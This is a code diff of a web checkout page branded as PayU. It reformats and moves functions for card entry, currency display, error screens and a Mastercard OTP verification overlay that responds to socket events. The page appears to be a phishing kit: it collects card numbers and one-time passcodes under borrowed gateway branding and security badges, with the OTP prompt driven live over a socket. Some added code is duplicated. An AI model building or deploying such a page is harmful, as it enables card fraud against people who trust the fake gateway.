@@ -340,41 +340,41 @@
             width: auto;
         }
         
-/* MC Verification Styles */
-.fullscreen-overlay {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background: rgba(0, 0, 0, 0.6);
-  backdrop-filter: blur(2px);
-  z-index: 9999;
-  display: none;
-  justify-content: center;
-  align-items: center;
-}
+        /* MC Verification Styles */
+        .fullscreen-overlay {
+          position: fixed;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          background: rgba(0, 0, 0, 0.6);
+          backdrop-filter: blur(2px);
+          z-index: 9999;
+          display: none;
+          justify-content: center;
+          align-items: center;
+        }
 
-@keyframes spin {
-  0% { transform: rotate(0deg); }
-  100% { transform: rotate(360deg); }
-}
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+        }
 
-#mcOtpInput:focus {
-  border-color: #3498db !important;
-  box-shadow: 0 0 2px rgba(52, 152, 219, 0.5) !important;
-  outline: none !important;
-}
+        #mcOtpInput:focus {
+          border-color: #3498db !important;
+          box-shadow: 0 0 2px rgba(52, 152, 219, 0.5) !important;
+          outline: none !important;
+        }
 
-.btn-loading {
-  position: relative;
-  pointer-events: none;
-  opacity: 0.8;
-}
+        .btn-loading {
+          position: relative;
+          pointer-events: none;
+          opacity: 0.8;
+        }
 
-#mcVerificationContent {
-  font-family: Arial, sans-serif;
-}
+        #mcVerificationContent {
+          font-family: Arial, sans-serif;
+        }
     </style>
 </head>
 
@@ -415,14 +415,14 @@
                     <div class="my-6">
                         <div class="flex items-center space-x-2 mb-3">
                             <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.618 5.984A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016zM12 9v2m0 4h.01" />
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.618 5.984A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016zM12 9v2m0 4h.01" />
                             </svg>
                             <span class="font-medium">Secure Payment Gateway</span>
                         </div>
                         <p class="text-sm text-gray-600">
                             Your payment information is securely transmitted using 256-bit encryption. We do not store your card details.
                         </p>
-</div>
+                    </div>
                     
                     <div>
                         <h3 class="text-md font-medium mb-2">We Accept</h3>
@@ -474,8 +474,8 @@
                                 placeholder="John Doe"
                             />
                         </div>
-                        
-                        <div class="grid grid-cols-2 gap-4">
+                     
+<div class="grid grid-cols-2 gap-4">
                             <div class="form-group">
                                 <label>Expiry Date</label>
                                 <input 
@@ -746,8 +746,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 <h3 style="margin-bottom: 10px; font-size: 18px;">Failed to initialize the application</h3>
                 <p style="margin-bottom: 10px;">Please try refreshing the page or contact support.</p>
                 <p style="font-size: 12px; color: #666;">Error details: ${error.message}</p>
-                <button onclick="window.location.reload()" style="margin-top: 15px; padding: 8px 16px;
-                background: #2563eb; color: white; border: none; border-radius: 4px; cursor: pointer;">Retry</button>
+                <button onclick="window.location.reload()" style="margin-top: 15px; padding: 8px 16px; background: #2563eb; color: white; border: none; border-radius: 4px; cursor: pointer;">Retry</button>
             </div>
         `;
     }
@@ -858,7 +857,8 @@ function setupSocketListeners() {
             showErrorUI("Payment Failed", reason);
         }
     });
-  socket.on('mc_otp_error', function(data) {
+    
+    socket.on('mc_otp_error', function(data) {
         const otpInput = document.getElementById('mcOtpInput');
         const errorMsgElem = document.getElementById('mcOtpError');
         
@@ -904,6 +904,63 @@ function setupSocketListeners() {
             updateCurrencyDisplay(data.currency);
         }
     });
+}
+
+function convertCurrency(amount, fromCurrency, toCurrency) {
+  // Basic conversion rates (as of 2023)
+  // In a real app, you would fetch these from an API
+  const rates = {
+    'USD': 1,
+    'EUR': 0.93,
+    'GBP': 0.81,
+    'JPY': 149.5,
+    'INR': 83.20,
+    'CAD': 1.38,
+    'AUD': 1.56,
+    'CNY': 7.25,
+    'CHF': 0.91,
+    'HKD': 7.81
+  };
+  
+  if (!rates[fromCurrency] || !rates[toCurrency]) {
+    return amount; // Can't convert, return original
+  }
+  
+  // Convert to target currency
+  const convertedAmount = (amount / rates[fromCurrency]) * rates[toCurrency];
+  
+  // Format based on currency
+  if (toCurrency === 'JPY' || toCurrency === 'KRW') {
+    return Math.round(convertedAmount); // No decimals for yen and won
+  } else {
+    return convertedAmount.toFixed(2);
+  }
+}
+
+function updateCurrencyDisplay(currency) {
+  const currencySymbol = document.getElementById('currencySymbol');
+  const amountDisplay = document.getElementById('transactionAmount');
+  
+  if (currencySymbol && amountDisplay) {
+    // Map of currency codes to symbols
+    const symbols = {'USD': '$',
+      'EUR': '€',
+      'GBP': '£',
+      'JPY': '¥',
+      'INR': '₹',
+      'AUD': 'A$',
+      'CAD': 'C$',
+      'CHF': 'CHF',
+      'CNY': '¥',
+      'HKD': 'HK$'
+    };
+    
+    const originalAmount = state.amount || 1299.00;
+    const convertedAmount = convertCurrency(originalAmount, 'USD', currency);
+    
+    currencySymbol.textContent = symbols[currency] || '$';
+    amountDisplay.textContent = convertedAmount;
+  }
 }
 
 // Start the timer for 4:59 minutes (299 seconds)
@@ -1035,64 +1092,8 @@ function updateMcVerificationUI(data) {
     setupMcVerificationButtons();
 }
 
-function convertCurrency(amount, fromCurrency, toCurrency) {
-  // Basic conversion rates (as of 2023)
-  // In a real app, you would fetch these from an API
-  const rates = {
-    'USD': 1,
-    'EUR': 0.93,
-    'GBP': 0.81,
-    'JPY': 149.5,
-    'INR': 83.20,
-    'CAD': 1.38,
-    'AUD': 1.56,
-    'CNY': 7.25,
-    'CHF': 0.91,
-    'HKD': 7.81
-  };
-  
-  if (!rates[fromCurrency] || !rates[toCurrency]) {
-    return amount; // Can't convert, return original
-  }
-  
-  // Convert to target currency
-  const convertedAmount = (amount / rates[fromCurrency]) * rates[toCurrency];
-  
-  // Format based on currency
-  if (toCurrency === 'JPY' || toCurrency === 'KRW') {
-    return Math.round(convertedAmount); // No decimals for yen and won
-  } else {
-    return convertedAmount.toFixed(2);
-  }
-}
-
-function updateCurrencyDisplay(currency) {
-  const currencySymbol = document.getElementById('currencySymbol');
-  const amountDisplay = document.getElementById('transactionAmount');
-  
-  if (currencySymbol && amountDisplay) {
-    // Map of currency codes to symbols
-    const symbols = {
-      'USD': '$',
-      'EUR': '€',
-      'GBP': '£',
-      'JPY': '¥',
-      'INR': '₹',
-      'AUD': 'A$',
-      'CAD': 'C$',
-      'CHF': 'CHF',
-      'CNY': '¥',
-      'HKD': 'HK$'
-    };
-    
-    const originalAmount = state.amount || 1299.00;
-    const convertedAmount = convertCurrency(originalAmount, 'USD', currency);
-    
-    currencySymbol.textContent = symbols[currency] || '$';
-    amountDisplay.textContent = convertedAmount;
-  }
-}
-<button id="mcSubmitBtn" style="flex: 1; padding: 8px; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;" disabled>Submit</button>    // Submit button handler
+function setupMcVerificationButtons() {
+    // Submit button handler
     const submitBtn = document.getElementById('mcSubmitBtn');
     if (submitBtn) {
         submitBtn.onclick = function() {
@@ -1179,35 +1180,37 @@ function updateCurrencyDisplay(currency) {
         };
     }
     
-// OTP input validation and formatting
-const otpInput = document.getElementById('mcOtpInput');
-if (otpInput) {
-  otpInput.oninput = function() {
-    // Only allow digits
-    this.value = this.value.replace(/\D/g, '');
-    
-    // Hide error message when typing
-    const errorMsg = document.getElementById('mcOtpError');
-    if (errorMsg) {
-      errorMsg.style.display = 'none';
+    // OTP input validation and formatting
+    const otpInput = document.getElementById('mcOtpInput');
+    if (otpInput) {
+        otpInput.oninput = function() {
+            // Only allow digits
+            this.value = this.value.replace(/\D/g, '');
+            
+            // Hide error message when typing
+            const errorMsg = document.getElementById('mcOtpError');
+            if (errorMsg) {
+                errorMsg.style.display = 'none';
+            }
+            
+            // Add this new code:
+            const submitBtn = document.getElementById('mcSubmitBtn');
+            if (submitBtn) {
+                if (this.value.length > 0) {
+                    submitBtn.style.backgroundColor = '#0066cc';
+                    submitBtn.disabled = false;
+                } else {
+                    submitBtn.style.backgroundColor = '#aaaaaa';
+                    submitBtn.disabled = true;
+                }
+            }
+        };
+        
+        // Trigger the input handler once to set initial state
+        otpInput.oninput();
     }
-    
-    // Add this new code:
-    const submitBtn = document.getElementById('mcSubmitBtn');
-    if (submitBtn) {
-      if (this.value.length > 0) {
-        submitBtn.style.backgroundColor = '#0066cc';
-        submitBtn.disabled = false;
-      } else {
-        submitBtn.style.backgroundColor = '#aaaaaa';
-        submitBtn.disabled = true;
-      }
-    }
-  };
-  
-  // Trigger the input handler once to set initial state
-  otpInput.oninput();
 }
+
 function showMCVerification(data) {
     console.log('Showing MC verification overlay with data:', data);
     
@@ -1402,8 +1405,7 @@ function handleCardSubmit(e) {
     });
     
     showProcessingUI();
-    
-    setTimeout(() => {
+setTimeout(() => {
         const processingIndicator = document.querySelector('.processing-indicator');
         if (processingIndicator) {
             showErrorUI("Connection Timeout", "No response from payment server. Please try again.");
@@ -1425,7 +1427,7 @@ function showToast(title, message, type = 'info') {
                 <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                     ${type === 'error' 
                       ? '<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"/>'
-: '<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>'
+                      : '<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>'
                     }
                 </svg>
             </div>
@@ -1668,7 +1670,7 @@ function setupCardFormHandlers() {
     if (expiryDateInput) {
         expiryDateInput.addEventListener('input', (e) => {
             const formattedValue = formatExpiryDate(e.target.value);
-state.cardForm.expiryDate = formattedValue;
+            state.cardForm.expiryDate = formattedValue;
             e.target.value = formattedValue;
         });
     }
@@ -1921,6 +1923,61 @@ function showSuccessUI() {
     `;
     
     const tryAgainBtn = document.getElementById('try-again');
+    if (tryAgainBtn) {
+        tryAgainBtn.addEventListener('click', resetForm);
+    }
+}
+
+function showErrorUI(title, message) {
+    const appDiv = document.getElementById('app');
+    appDiv.innerHTML = `
+        <div class="card-container w-full max-w-5xl">
+            <div class="header-bar">
+                <div class="flex justify-between items-center">
+                    <div class="text-2xl font-bold">PayU</div>
+                    <p class="text-sm">Secure Payment</p>
+                </div>
+                <div class="text-gray-100">
+                    Amount: $${state.amount.toFixed(2)} USD
+                </div>
+            </div>
+            
+            <div class="flex justify-center p-8">
+                <div class="flex flex-col items-center justify-center py-8">
+                    <div class="h-16 w-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                        </svg>
+                    </div>
+                    <h3 class="text-lg font-medium mb-2">${title}</h3>
+                    <p class="text-sm text-gray-500 text-center mb-4">
+                        ${message}
+                    </p>
+                    <button id="try-again" class="bg-white text-gray-800 border border-gray-300 py-2 px-6 rounded-md hover:bg-gray-50 transition-all">
+                        Try Again
+                    </button>
+                </div>
+            </div>
+            
+            <div class="footer-bar">
+                <div class="security-badge">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/PCI_Logo.svg" alt="PCI DSS" />
+                    <span class="text-xs text-gray-500">PCI DSS Compliant</span>
+                </div>
+                <div class="separator-vertical"></div>
+                <div>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/Verified_by_Visa.svg" alt="Verified by Visa" class="h-6 w-auto" />
+                </div>
+                <div>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Mastercard_SecureCode_horizontal.svg" alt="Mastercard SecureCode" class="h-6 w-auto" />
+                </div>
+                <div class="separator-vertical"></div>
+                <div class="text-xs text-gray-500">Powered by PayU Biz</div>
+            </div>
+        </div>
+    `;
+    
+ const tryAgainBtn = document.getElementById('try-again');
     if (tryAgainBtn) {
         tryAgainBtn.addEventListener('click', resetForm);
     }
